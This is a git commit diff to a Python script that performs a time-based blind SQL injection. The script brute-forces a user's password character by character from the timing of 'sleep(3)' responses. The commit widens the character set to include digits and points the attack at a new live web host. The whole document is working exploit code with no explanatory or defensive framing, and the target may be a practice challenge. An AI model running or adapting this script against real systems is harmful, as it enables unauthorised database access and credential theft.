f4eb246fd6c939c54e5ba8c8e47c9482a1a9147b
g3zb0yy <b0d3ns33@criminal.li>
2021-02-17 16:15:17 +0100

    Update sqlitotalblind.py

--- sqlitotalblind.py
+++ sqlitotalblind.py
@@ -2,13 +2,19 @@ import requests
 
 def main():
     try:
+        allinone = []
+        num = [int(i) for i in range(0, 10)]
         alpha = [chr(i) for i in range(ord('a'), ord('z') + 1)]
+        for a in num:
+            allinone.append(str(a))
+        for b in alpha:
+            allinone.append(b)
         found = ""
         while True:
-            for b in alpha:
+            for b in allinone:
                 u = found + b + "%"
                 print("U: {}".format(u))
-                url = "http://chall.voilixa.ml/chall/Barragan.php?id=1 and (select sleep(3) from users where id=1 and password like " + "0x" + u.encode("utf-8").hex() + ")"
+                url = "http://toronto.alwaysdata.net/time/time.php?id=1 and (select sleep(3) from users where id=1 and password like " + "0x" + u.encode("utf-8").hex() + ")"
                 response = requests.get(url)
                 if response.elapsed.total_seconds() > 2:
                     print("Matched {}: {}".format(u, response.elapsed.total_seconds()))
